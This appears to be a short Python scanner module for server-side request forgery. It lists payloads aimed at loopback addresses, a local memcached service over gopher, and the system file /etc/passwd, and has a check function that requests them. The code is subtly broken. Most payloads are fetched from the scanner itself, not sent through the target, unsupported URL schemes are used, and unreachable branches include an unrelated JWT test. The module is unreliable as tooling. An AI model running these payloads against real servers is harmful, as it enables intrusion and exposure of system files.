# Exotic Ssrf.Py Module

import requests

payloads = ["http://2130706433/", "http://127.0.0.1@target.com", "gopher://localhost:11211/", "file:///etc/passwd"]

def check(target_url):
    results = []
    for payload in payloads:
        try:
            if isinstance(payload, str):
                url = target_url.rstrip("/") + payload if payload.startswith("/") else payload
                r = requests.get(url, timeout=5)
                results.append({"url": url, "status_code": r.status_code, "length": len(r.text)})
            elif isinstance(payload, dict) and "header" in payload and "value" in payload:
                r = requests.get(target_url, headers={payload["header"]: payload["value"]}, timeout=5)
                results.append({"url": target_url, "status_code": r.status_code, "headers": dict(r.headers)})
            elif isinstance(payload, dict) and "alg" in payload:
                results.append({"jwt_test_payload": payload})
        except Exception as e:
            results.append({"payload": payload, "error": str(e)})
    return results
